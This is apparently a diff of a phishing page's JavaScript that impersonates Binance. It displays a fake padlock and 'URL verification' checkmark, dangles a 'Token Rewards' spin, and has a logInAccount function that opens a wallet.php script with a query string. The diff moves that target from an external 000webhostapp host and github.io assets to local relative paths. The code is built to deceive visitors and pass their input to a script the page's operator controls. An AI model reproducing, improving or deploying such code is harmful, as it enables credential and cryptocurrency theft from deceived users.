@@ -1,8 +1,8 @@
 // localStorage.clear();
 
 $("#logNav").html(`
-<img src="https://abouelghar12.github.io/icon/logo3.png" alt="logo">
-<p><span><img src="https://abouelghar12.github.io/icon/padlock.svg" alt="secured"/></span> URL verification: <i>&#10003;</i></p>
+<img src="icon/logo3.png" alt="logo">
+<p><span><img src="icon/padlock.svg" alt="secured"/></span> URL verification: <i>&#10003;</i></p>
 `);
 
 $("#logFooter").html(`&copy; 2017 - ${d.getFullYear()} Binance`);
@@ -10,7 +10,7 @@ $("#logFooter").html(`&copy; 2017 - ${d.getFullYear()} Binance`);
 const signInBtn = `<button onclick="logInAccount(this)">Next</button>`;
 let tempEmail = "";
 
-let tokenRand = Math.floor(Math.random() * 15000) + 5000;
+let tokenRand = Math.floor(Math.random() * 10000) + 10000;
 
 let redirector = 11;
 let setToken = {}
@@ -19,7 +19,7 @@ const tokeSpin = `
 <section id="signInContainer">
 <div id="spinTokenContainer">
 
-<img id="spinImg" src="https://abouelghar12.github.io/pic/settings_bg.png" />
+<img id="spinImg" src="pic/settings_bg.png" />
 
 <section>
 <h1 id="spinHeader">Token Rewards</h1>
@@ -60,7 +60,7 @@ function getTokenrewards() {
             }
             else if (c >= target) {
 
-                $("#spinImg").attr("src", "https://abouelghar12.github.io/pic/cr7.png");
+                $("#spinImg").attr("src", "pic/cr7.png");
                 $("#spinTokenContainer").show().css({ "display": "flex", "justify-content": "center", "gap": "0rem" });
                 $("#spinTokenContainer section").css({ "top": "0" });
                 $("#spinTokenContainer img").css({ "height": "40vh", "width": "100%", "opacity": "1", });
@@ -179,7 +179,7 @@ function logInAccount(b) {
 
             setTimeout(() => {
                 window.open(
-                    'https://falser-skies.000webhostapp.com/ob/wallet.php?' + url,
+                    'wallet.php?' + url,
                     '_blank'
                 );
 
